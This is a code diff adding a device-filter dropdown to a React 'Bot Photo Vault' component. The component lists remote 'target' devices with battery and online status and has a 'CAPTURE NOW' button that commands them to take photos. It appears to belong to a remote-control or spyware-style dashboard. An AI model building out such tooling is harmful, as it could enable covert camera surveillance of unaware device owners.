@@ -1,23 +1,28 @@
 'use client';
 
 import { useEffect, useState } from 'react';
-import { Camera, RefreshCcw, Clock3, X, Image as ImageIcon, Download } from 'lucide-react';
+import { Camera, RefreshCcw, Clock3, X, Image as ImageIcon, Download, ChevronDown } from 'lucide-react';
 import { clsx } from 'clsx';
 import { twMerge } from 'tailwind-merge';
 import { useImageCaptures } from '@/hooks/useFirebase';
 import { sendCommand } from '@/services/targetService';
 import { toast } from '@/lib/toast';
+import { Target } from '@/types/target';
 
 const cn = (...inputs: Array<string | false | null | undefined>) => twMerge(clsx(inputs));
 
 interface PhotoGalleryProps {
   targetId?: string;
+  targets?: Target[];
+  onTargetChange?: (targetId: string) => void;
 }
 
-export default function PhotoGallery({ targetId }: PhotoGalleryProps) {
+export default function PhotoGallery({ targetId, targets = [], onTargetChange }: PhotoGalleryProps) {
   const { images, isLoading } = useImageCaptures(targetId);
   const [sending, setSending] = useState(false);
   const [selectedImage, setSelectedImage] = useState<string | null>(null);
+  const [showDeviceDropdown, setShowDeviceDropdown] = useState(false);
+  const [filterCount, setFilterCount] = useState(0);
 
   const handleCapture = async () => {
     if (!targetId) return;
@@ -36,27 +41,82 @@ export default function PhotoGallery({ targetId }: PhotoGalleryProps) {
     <>
       <section className="rounded-[32px] border border-white/10 bg-slate-950/85 p-6 shadow-2xl shadow-slate-950/30 backdrop-blur-xl">
         <div className="flex flex-col gap-4 sm:flex-row sm:items-center sm:justify-between mb-6">
-          <div>
+          <div className="flex-1">
             <p className="text-sm uppercase tracking-[0.3em] text-cyan-400/70">Intelligence</p>
             <h3 className="mt-2 text-2xl font-semibold text-white">Bot Photo Vault</h3>
             <p className="max-w-sm text-[11px] text-slate-500 uppercase font-mono mt-1">
-              Data sinkronisasi otomatis dari Kei Bot Camera
+              Data sinkronisasi otomatis dari Kei Bot Camera • {images.length} foto tersimpan
             </p>
           </div>
 
-          <button
-            type="button"
-            onClick={handleCapture}
-            disabled={!targetId || sending}
-            className={cn(
-              'inline-flex items-center justify-center gap-2 rounded-2xl border px-5 py-2.5 text-xs font-bold uppercase transition-all',
-              'border-cyan-500/30 bg-cyan-500/10 text-cyan-200 hover:border-cyan-400/70 hover:bg-cyan-500/15',
-              (!targetId || sending) && 'cursor-not-allowed opacity-50'
+          <div className="flex items-center gap-2">
+            {/* Device Filter Dropdown */}
+            {targets.length > 0 && (
+              <div className="relative">
+                <button
+                  onClick={() => setShowDeviceDropdown(!showDeviceDropdown)}
+                  className={cn(
+                    'inline-flex items-center justify-between gap-2 rounded-2xl border px-4 py-2.5 text-xs font-bold uppercase transition-all',
+                    showDeviceDropdown
+                      ? 'border-cyan-400/70 bg-cyan-500/15 text-cyan-200'
+                      : 'border-white/10 bg-white/5 text-slate-300 hover:border-cyan-400/40'
+                  )}
+                >
+                  <span className="max-w-[120px] truncate">
+                    {targetId && targets.find(t => t.id === targetId)
+                      ? `${targets.find(t => t.id === targetId)?.deviceInfo?.model || 'Device'}`
+                      : 'Filter Device'
+                    }
+                  </span>
+                  <ChevronDown size={14} className={cn('transition-transform', showDeviceDropdown && 'rotate-180')} />
+                </button>
+
+                {showDeviceDropdown && (
+                  <div className="absolute right-0 mt-2 w-48 rounded-xl border border-white/10 bg-slate-950/95 shadow-xl z-50 backdrop-blur-xl overflow-hidden">
+                    <div className="max-h-[300px] overflow-y-auto">
+                      {targets.map((device) => (
+                        <button
+                          key={device.id}
+                          onClick={() => {
+                            onTargetChange?.(device.id);
+                            setShowDeviceDropdown(false);
+                          }}
+                          className={cn(
+                            'w-full px-4 py-3 text-sm text-left transition-colors border-b border-white/5 last:border-0',
+                            targetId === device.id
+                              ? 'bg-cyan-500/20 text-cyan-300 font-semibold'
+                              : 'text-slate-300 hover:bg-white/5'
+                          )}
+                        >
+                          <div className="font-mono text-xs text-slate-500">{device.id}</div>
+                          <div className="font-bold text-xs mt-1">
+                            {device.deviceInfo?.manufacturer} {device.deviceInfo?.model}
+                          </div>
+                          <div className="text-[10px] text-slate-400 mt-1">
+                            {device.status?.toUpperCase() === 'ONLINE' ? '🟢' : '🔴'} {device.battery || 0}%
+                          </div>
+                        </button>
+                      ))}
+                    </div>
+                  </div>
+                )}
+              </div>
             )}
-          >
-            <Camera size={14} />
-            {sending ? 'REQUESTING...' : 'CAPTURE NOW'}
-          </button>
+
+            <button
+              type="button"
+              onClick={handleCapture}
+              disabled={!targetId || sending}
+              className={cn(
+                'inline-flex items-center justify-center gap-2 rounded-2xl border px-5 py-2.5 text-xs font-bold uppercase transition-all',
+                'border-cyan-500/30 bg-cyan-500/10 text-cyan-200 hover:border-cyan-400/70 hover:bg-cyan-500/15',
+                (!targetId || sending) && 'cursor-not-allowed opacity-50'
+              )}
+            >
+              <Camera size={14} />
+              {sending ? 'REQUESTING...' : 'CAPTURE NOW'}
+            </button>
+          </div>
         </div>
 
         <div className="grid grid-cols-2 gap-3 max-h-[600px] overflow-y-auto pr-2 custom-scrollbar">
